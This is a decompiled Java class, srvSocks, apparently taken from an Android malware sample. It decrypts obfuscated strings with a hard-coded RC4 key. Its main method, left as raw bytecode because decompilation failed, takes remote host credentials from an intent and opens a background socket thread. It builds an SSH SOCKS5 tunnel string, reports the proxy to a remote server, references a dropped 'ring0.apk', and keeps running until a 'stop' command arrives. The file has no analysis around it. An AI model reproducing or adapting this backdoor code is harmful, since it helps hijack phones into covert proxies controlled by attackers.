package com.example.mmm.Service;

import android.app.*;
import com.example.mmm.Utils.*;
import com.example.mmm.*;
import com.example.mmm.API.*;
import android.util.*;
import android.content.*;
import java.util.*;

public class srvSocks extends IntentService
{
    utils missions$;
    constants monster$;
    
    public srvSocks() {
        super("");
        this.missions$ = new utils();
        this.monster$ = new constants();
    }
    
    public final String decrypt_str(String s) {
        s = new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode(s, 0), "UTF-8"))));
        return s;
    }
    
    protected void onHandleIntent(final Intent \u0131ntent) {
        // 
        // This method could not be decompiled.
        // 
        // Original Bytecode:
        // 
        //     1: getf\u0131eld        com/example/mmm/Service/srvSocks.missions$:Lcom/example/mmm/Utils/utils;
        //     4: aload_0        
        //     5: ldc             "S5"
        //     7: ldc             ""
        //     9: \u0131nvokev\u0131rtual   com/example/mmm/Utils/utils.SettingsWrite:(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
        //    12: aload_0        
        //    13: \u0131nvokestat\u0131c    com/example/mmm/Utils/utils.countrySIM:(Landroid/content/Context;)Ljava/lang/String;
        //    16: astore_3       
        //    17: aload_3        
        //    18: astore_2       
        //    19: aload_3        
        //    20: \u0131nvokev\u0131rtual   java/lang/String.length:()I
        //    23: \u0131const_2       
        //    24: \u0131f_\u0131cmpeq       37
        //    27: \u0131nvokestat\u0131c    java/util/Locale.getDefault:()Ljava/util/Locale;
        //    30: \u0131nvokev\u0131rtual   java/util/Locale.getCountry:()Ljava/lang/String;
        //    33: \u0131nvokev\u0131rtual   java/lang/String.toLowerCase:()Ljava/lang/String;
        //    36: astore_2       
        //    37: aload_1        
        //    38: ldc             "host"
        //    40: \u0131nvokev\u0131rtual   android/content/Intent.getStringExtra:(Ljava/lang/String;)Ljava/lang/String;
        //    43: astore_3       
        //    44: aload_1        
        //    45: ldc             "user"
        //    47: \u0131nvokev\u0131rtual   android/content/Intent.getStringExtra:(Ljava/lang/String;)Ljava/lang/String;
        //    50: astore          4
        //    52: aload_1        
        //    53: ldc             "pass"
        //    55: \u0131nvokev\u0131rtual   android/content/Intent.getStringExtra:(Ljava/lang/String;)Ljava/lang/String;
        //    58: astore          5
        //    60: aload_1        
        //    61: ldc             "port"
        //    63: \u0131nvokev\u0131rtual   android/content/Intent.getStringExtra:(Ljava/lang/String;)Ljava/lang/String;
        //    66: astore_1       
        //    67: aload_0        
        //    68: getf\u0131eld        com/example/mmm/Service/srvSocks.missions$:Lcom/example/mmm/Utils/utils;
        //    71: aload_0        
        //    72: aload_0        
        //    73: getf\u0131eld        com/example/mmm/Service/srvSocks.missions$:Lcom/example/mmm/Utils/utils;
        //    76: aload_0        
        //    77: ldc             "QQ"
        //    79: \u0131nvokev\u0131rtual   com/example/mmm/Utils/utils.SettingsRead:(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
        //    82: aload_2        
        //    83: aload_3        
        //    84: aload_1        
        //    85: aload           4
        //    87: aload           5
        //    89: \u0131nvokev\u0131rtual   com/example/mmm/Utils/utils._markers:(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //    92: ldc             "+"
        //    94: \u0131nvokev\u0131rtual   java/lang/String.equals:(Ljava/lang/Object;)Z
        //    97: \u0131feq            374
        //   100: new             Ljava/lang/Thread;
        //   103: dup            
        //   104: new             Lcom/example/mmm/Service/srvSocks$SocketRunnable;
        //   107: dup            
        //   108: aload_0        
        //   109: \u0131nvokespec\u0131al   com/example/mmm/Service/srvSocks$SocketRunnable.<init>:(Lcom/example/mmm/Service/srvSocks;)V
        //   112: \u0131nvokespec\u0131al   java/lang/Thread.<init>:(Ljava/lang/Runnable;)V
        //   115: astore_2       
        //   116: aload_2        
        //   117: \u0131nvokev\u0131rtual   java/lang/Thread.start:()V
        //   120: aload_0        
        //   121: getf\u0131eld        com/example/mmm/Service/srvSocks.missions$:Lcom/example/mmm/Utils/utils;
        //   124: astore          6
        //   126: aconst_null    
        //   127: dup            
        //   128: aload_0        
        //   129: ldc             "apk"
        //   131: \u0131const_0       
        //   132: \u0131nvokev\u0131rtual   android/content/Context.getDir:(Ljava/lang/String;I)Ljava/io/File;
        //   135: ldc             "ring0.apk"
        //   137: pop            
        //   138: pop            
        //   139: pop            
        //   140: nop            
        //   141: pop            
        //   142: \u0131const_0       
        //   143: pop            
        //   144: goto            187
        //   147: nop            
        //   148: nop            
        //   149: nop            
        //   150: nop            
        //   151: nop            
        //   152: nop            
        //   153: nop            
        //   154: nop            
        //   155: nop            
        //   156: nop            
        //   157: nop            
        //   158: nop            
        //   159: nop            
        //   160: nop            
        //   161: nop            
        //   162: nop            
        //   163: nop            
        //   164: nop            
        //   165: nop            
        //   166: nop            
        //   167: nop            
        //   168: nop            
        //   169: nop            
        //   170: nop            
        //   171: nop            
        //   172: nop            
        //   173: nop            
        //   174: nop            
        //   175: nop            
        //   176: nop            
        //   177: nop            
        //   178: nop            
        //   179: nop            
        //   180: nop            
        //   181: nop            
        //   182: nop            
        //   183: nop            
        //   184: nop            
        //   185: nop            
        //   186: athrow         
        //   187: aload_0        
        //   188: getf\u0131eld        com/example/mmm/Service/srvSocks.missions$:Lcom/example/mmm/Utils/utils;
        //   191: ldc             "START"
        //   193: ldc             "START SOCKS"
        //   195: \u0131nvokev\u0131rtual   com/example/mmm/Utils/utils.Log:(Ljava/lang/String;Ljava/lang/String;)V
        //   198: new             Ljava/lang/StringBuilder;
        //   201: dup            
        //   202: \u0131nvokespec\u0131al   java/lang/StringBuilder.<init>:()V
        //   205: astore          5
        //   207: aload           5
        //   209: ldc             "Socks5: ssh -L "
        //   211: \u0131nvokev\u0131rtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   214: pop            
        //   215: aload           5
        //   217: aload_1        
        //   218: \u0131nvokev\u0131rtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   221: pop            
        //   222: aload           5
        //   224: ldc             ":127.0.0.1:"
        //   226: \u0131nvokev\u0131rtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   229: pop            
        //   230: aload           5
        //   232: aload_1        
        //   233: \u0131nvokev\u0131rtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   236: pop            
        //   237: aload           5
        //   239: ldc             " "
        //   241: \u0131nvokev\u0131rtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   244: pop            
        //   245: aload           5
        //   247: aload           4
        //   249: \u0131nvokev\u0131rtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   252: pop            
        //   253: aload           5
        //   255: ldc             "@"
        //   257: \u0131nvokev\u0131rtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   260: pop            
        //   261: aload           5
        //   263: aload_3        
        //   264: \u0131nvokev\u0131rtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   267: pop            
        //   268: aload           5
        //   270: ldc             "[143523#]"
        //   272: \u0131nvokev\u0131rtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   275: pop            
        //   276: aload           5
        //   278: \u0131nvokev\u0131rtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //   281: astore_1       
        //   282: aload_0        
        //   283: getf\u0131eld        com/example/mmm/Service/srvSocks.missions$:Lcom/example/mmm/Utils/utils;
        //   286: aload_0        
        //   287: ldc             "AS"
        //   289: aload_1        
        //   290: \u0131nvokev\u0131rtual   com/example/mmm/Utils/utils.SettingsToAdd:(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
        //   293: aload_0        
        //   294: getf\u0131eld        com/example/mmm/Service/srvSocks.missions$:Lcom/example/mmm/Utils/utils;
        //   297: aload_0        
        //   298: aload_0        
        //   299: getf\u0131eld        com/example/mmm/Service/srvSocks.missions$:Lcom/example/mmm/Utils/utils;
        //   302: aload_0        
        //   303: ldc             "QQ"
        //   305: \u0131nvokev\u0131rtual   com/example/mmm/Utils/utils.SettingsRead:(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
        //   308: \u0131nvokev\u0131rtual   com/example/mmm/Utils/utils._compiled:(Landroid/content/Context;Ljava/lang/String;)V
        //   311: getstat\u0131c       java/util/concurrent/TimeUnit.MILLISECONDS:Ljava/util/concurrent/TimeUnit;
        //   314: ldc2_w          10000
        //   317: \u0131nvokev\u0131rtual   java/util/concurrent/TimeUnit.sleep:(J)V
        //   320: goto            328
        //   323: nop            
        //   324: nop            
        //   325: nop            
        //   326: nop            
        //   327: athrow         
        //   328: aload_0        
        //   329: getf\u0131eld        com/example/mmm/Service/srvSocks.missions$:Lcom/example/mmm/Utils/utils;
        //   332: aload_0        
        //   333: aload_0        
        //   334: getf\u0131eld        com/example/mmm/Service/srvSocks.missions$:Lcom/example/mmm/Utils/utils;
        //   337: aload_0        
        //   338: ldc             "QQ"
        //   340: \u0131nvokev\u0131rtual   com/example/mmm/Utils/utils.SettingsRead:(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
        //   343: \u0131nvokev\u0131rtual   com/example/mmm/Utils/utils.sendAddSocks5:(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
        //   346: pop            
        //   347: aload_0        
        //   348: getf\u0131eld        com/example/mmm/Service/srvSocks.missions$:Lcom/example/mmm/Utils/utils;
        //   351: aload_0        
        //   352: ldc             "S5"
        //   354: \u0131nvokev\u0131rtual   com/example/mmm/Utils/utils.SettingsRead:(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
        //   357: ldc             "stop"
        //   359: \u0131nvokev\u0131rtual   java/lang/String.equals:(Ljava/lang/Object;)Z
        //   362: \u0131feq            311
        //   365: aload_2        
        //   366: \u0131nvokev\u0131rtual   java/lang/Thread.interrupt:()V
        //   369: aload_0        
        //   370: \u0131nvokev\u0131rtual   com/example/mmm/Service/srvSocks.stopSelf:()V
        //   373: return         
        //   374: new             Ljava/lang/StringBuilder;
        //   377: dup            
        //   378: \u0131nvokespec\u0131al   java/lang/StringBuilder.<init>:()V
        //   381: astore_2       
        //   382: aload_2        
        //   383: ldc             "Socks connection to server "
        //   385: \u0131nvokev\u0131rtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   388: pop            
        //   389: aload_2        
        //   390: aload_3        
        //   391: \u0131nvokev\u0131rtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   394: pop            
        //   395: aload_2        
        //   396: ldc             " is not possible, port "
        //   398: \u0131nvokev\u0131rtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   401: pop            
        //   402: aload_2        
        //   403: aload_1        
        //   404: \u0131nvokev\u0131rtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   407: pop            
        //   408: aload_2        
        //   409: ldc             " is busy[143523#]"
        //   411: \u0131nvokev\u0131rtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   414: pop            
        //   415: aload_2        
        //   416: \u0131nvokev\u0131rtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //   419: astore_1       
        //   420: aload_0        
        //   421: getf\u0131eld        com/example/mmm/Service/srvSocks.missions$:Lcom/example/mmm/Utils/utils;
        //   424: aload_0        
        //   425: ldc             "AS"
        //   427: aload_1        
        //   428: \u0131nvokev\u0131rtual   com/example/mmm/Utils/utils.SettingsToAdd:(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
        //   431: aload_0        
        //   432: getf\u0131eld        com/example/mmm/Service/srvSocks.missions$:Lcom/example/mmm/Utils/utils;
        //   435: aload_0        
        //   436: aload_0        
        //   437: getf\u0131eld        com/example/mmm/Service/srvSocks.missions$:Lcom/example/mmm/Utils/utils;
        //   440: aload_0        
        //   441: ldc             "QQ"
        //   443: \u0131nvokev\u0131rtual   com/example/mmm/Utils/utils.SettingsRead:(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
        //   446: \u0131nvokev\u0131rtual   com/example/mmm/Utils/utils._compiled:(Landroid/content/Context;Ljava/lang/String;)V
        //   449: aload_0        
        //   450: \u0131nvokev\u0131rtual   com/example/mmm/Service/srvSocks.stopSelf:()V
        //   453: return         
        //    StackMapTable: 00 07 FD 00 25 07 00 20 07 00 20 FF 00 6D 00 00 00 01 07 00 41 FF 00 27 00 07 07 00 02 07 00 20 07 00 7D 07 00 20 07 00 20 07 00 20 07 00 13 00 00 FF 00 7B 00 07 07 00 02 07 00 20 07 00 7D 07 00 20 07 00 20 07 00 9C 07 00 13 00 00 FF 00 0B 00 00 00 01 07 00 41 FF 00 04 00 07 07 00 02 07 00 20 07 00 7D 07 00 20 07 00 20 07 00 9C 07 00 13 00 00 FF 00 2D 00 06 07 00 02 07 00 20 07 00 20 07 00 20 07 00 20 07 00 20 00 00
        // 
        throw new IllegalStateException("An error occurred while decompiling this method.");
    }
}
